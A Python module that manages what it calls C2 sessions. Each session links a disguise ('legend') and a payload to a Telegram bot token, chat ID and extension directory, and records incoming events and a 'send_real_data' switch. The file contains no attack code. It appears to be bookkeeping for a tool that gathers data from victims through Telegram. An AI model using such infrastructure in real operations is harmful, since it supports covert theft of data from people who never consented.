import json
import uuid
from datetime import datetime
from dataclasses import dataclass, field, asdict
from pathlib import Path

from ..utils.logger import logger


SESSIONS_FILE = Path("./output/c2_sessions.json")


@dataclass
class C2Session:

    session_id: str
    legend_id: str
    payload_id: str
    legend_name: str
    payload_name: str
    bot_token: str
    chat_id: str
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    enabled: bool = True
    send_real_data: bool = False
    ext_dir: str = ""
    events: list = field(default_factory=list)
    notes: str = ""

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict) -> "C2Session":
        allowed = {
            "session_id", "legend_id", "payload_id",
            "legend_name", "payload_name", "bot_token", "chat_id",
            "created_at", "enabled", "send_real_data", "ext_dir",
            "events", "notes",
        }
        filtered = {k: v for k, v in data.items() if k in allowed}
        return cls(**filtered)


class C2Manager:

    def __init__(self, storage_file: Path | None = None):
        self.storage_file = storage_file or SESSIONS_FILE
        self._sessions: dict[str, C2Session] = {}
        self._load()

    def _load(self) -> None:
        if not self.storage_file.exists():
            logger.debug("[C2] No sessions file, starting fresh")
            return

        try:
            data = json.loads(self.storage_file.read_text(encoding="utf-8"))
            for item in data.get("sessions", []):
                try:
                    session = C2Session.from_dict(item)
                    self._sessions[session.session_id] = session
                except Exception as e:
                    logger.warning(f"[C2] Skipped invalid session: {e}")
            logger.info(f"[C2] Loaded {len(self._sessions)} sessions")
        except Exception as e:
            logger.error(f"[C2] Failed to load sessions: {e}")

    def _save(self) -> None:
        try:
            self.storage_file.parent.mkdir(parents=True, exist_ok=True)
            data = {
                "sessions": [s.to_dict() for s in self._sessions.values()],
                "updated_at": datetime.now().isoformat(),
            }
            self.storage_file.write_text(
                json.dumps(data, indent=2, ensure_ascii=False),
                encoding="utf-8",
            )
        except Exception as e:
            logger.error(f"[C2] Failed to save sessions: {e}")

    def create_session(
        self,
        legend_id: str,
        payload_id: str,
        legend_name: str,
        payload_name: str,
        bot_token: str,
        chat_id: str,
        enabled: bool = True,
        send_real_data: bool = False,
        ext_dir: str = "",
    ) -> C2Session:
        session_id = uuid.uuid4().hex[:12]

        session = C2Session(
            session_id=session_id,
            legend_id=legend_id,
            payload_id=payload_id,
            legend_name=legend_name,
            payload_name=payload_name,
            bot_token=bot_token,
            chat_id=str(chat_id),
            enabled=enabled,
            send_real_data=send_real_data,
            ext_dir=ext_dir,
        )

        self._sessions[session_id] = session
        self._save()

        logger.info(
            f"[C2] Session created: {session_id} "
            f"({legend_id} + {payload_id})"
        )
        return session

    def get(self, session_id: str) -> C2Session | None:
        return self._sessions.get(session_id)

    def list_all(self) -> list[C2Session]:
        return sorted(
            self._sessions.values(),
            key=lambda s: s.created_at,
            reverse=True,
        )

    def delete(self, session_id: str) -> bool:
        if session_id in self._sessions:
            del self._sessions[session_id]
            self._save()
            logger.info(f"[C2] Session deleted: {session_id}")
            return True
        return False

    def toggle(self, session_id: str, enabled: bool) -> bool:
        session = self.get(session_id)
        if session:
            session.enabled = enabled
            self._save()
            logger.info(f"[C2] Session {session_id} enabled={enabled}")
            return True
        return False

    def add_event(self, session_id: str, event: dict) -> bool:
        session = self.get(session_id)
        if not session:
            return False

        event["received_at"] = datetime.now().isoformat()
        session.events.append(event)
        if len(session.events) > 100:
            session.events = session.events[-100:]
        self._save()
        return True

    def count(self) -> int:
        return len(self._sessions)

    def clear_all(self) -> int:
        count = len(self._sessions)
        self._sessions.clear()
        self._save()
        return count


# Глобальный менеджер
c2_manager = C2Manager()


__all__ = ["C2Session", "C2Manager", "c2_manager"]
